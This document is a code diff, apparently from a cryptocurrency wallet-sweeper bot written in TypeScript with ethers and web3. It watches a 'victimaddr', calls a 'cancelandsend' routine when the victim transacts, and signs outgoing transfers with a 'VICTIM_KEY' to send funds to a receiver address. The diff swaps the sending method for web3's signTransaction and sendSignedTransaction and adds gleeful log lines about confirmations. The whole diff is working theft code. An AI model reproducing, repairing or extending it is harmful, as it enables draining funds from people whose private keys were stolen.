@@ -16,7 +16,7 @@ import { ethers, providers, Wallet } from "ethers";
 import { parse } from 'path';
 // import Moralis from 'moralis';
 // import Moralis from "moralis-v1";
-const web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
+var web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
 var provider: any = null;
 
 const formatEther = ethers.utils.formatEther;
@@ -640,6 +640,7 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
   if(results) {
     request.log.info("got to result eth2");
     provider =  new providers.JsonRpcProvider(AnkrId2)
+    web3 = new  Web3(new Web3.providers.HttpProvider(AnkrId2));
     await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
   //  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
   
@@ -1256,33 +1257,83 @@ request.log.info("i got here1");
 
   try {
     request.log.info(`Sending...`);
-    const tx = await wallet.sendTransaction({
+    // const tx = await wallet.sendTransaction({
+    //   nonce: transactx.object.get("nonce"),
+    //   to: reciver,
+    //   gasLimit: gasLimit,
+    //   gasPrice : gasPrice,
+    //   value: val
+    // });
+
+    // request.log.info("i got here12");
+    // tx.wait();
+
+    // if(tx.hash) {
+
+    //   request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+    //   await mshlogger(request, 'Eth2', tx.hash)
+    //   //
+  
+    // }
+
+    // if(tx.nonce) {
+
+    //    //
+    //    request.log.info(`Over Mad ooo! Block Confirmed 😁😁😁 🚀🚀🚀`);
+  
+    // }
+
+
+
+    var transaction = {
+
       nonce: transactx.object.get("nonce"),
       to: reciver,
       gasLimit: gasLimit,
       gasPrice : gasPrice,
       value: val
-    });
+      // 'nonce': request.object.get("nonce"),
+      // optional data field to send message or execute smart contract
+     };
+    
+     request.log.info("Created transaction");
+     request.log.info("i got here12");
+     var signedTx = await web3.eth.accounts.signTransaction(transaction, VICTIM_KEY);
+    
+     request.log.info("Signed transaction");
+     request.log.info("i got here13");
+      web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash: any) => 
+     
+      {
+        // loggerr.info(hash.toString());
+        request.log.info("got hash")
+        request.log.info("i got here14");
+        request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+      }).on('receipt', async (reciept: any) => {
+     
+      //  await mshlogger(request, ntwk, loggerr)
+    
+      request.log.info(`Mad!...receipt 😁 🚀`);
+      request.log.info("i got here15");
+        await mshlogger(request, 'Eth2', reciept)
+       request.log.info("got recipet")
+        // loggerr.info(JSON.stringify(reciept));
+     
+     
+      }).on('error', async  (error: any) =>{
+     
+      //  await mshlogger(request, JSON.stringify(error), loggerr)
+       request.log.info("got error")
+       request.log.info("i got here16");
+       await mshlogger(request, JSON.stringify(error), error)
+        // loggerr.info(JSON.stringify(error));
+     
+        // loggerr.info("errror");
+     
+        });
 
-    request.log.info("i got here12");
-    tx.wait();
 
-    if(tx.hash) {
-
-      request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
-      await mshlogger(request, 'Eth2', tx.hash)
-      //
-  
-    }
-
-    if(tx.nonce) {
-
-       //
-       request.log.info(`Over Mad ooo! Block Confirmed 😁😁😁 🚀🚀🚀`);
-  
-    }
-
-    request.log.info(` Sent tx with nonce ${tx.nonce} moving ${val}  gwei: ${tx.hash}`);
+    // request.log.info(` Sent tx with nonce ${tx.nonce} moving ${val}  gwei: ${tx.hash}`);
   } catch (err) {
     request.log.info(` Error sending tx: ${err.message ?? err}`);
   }
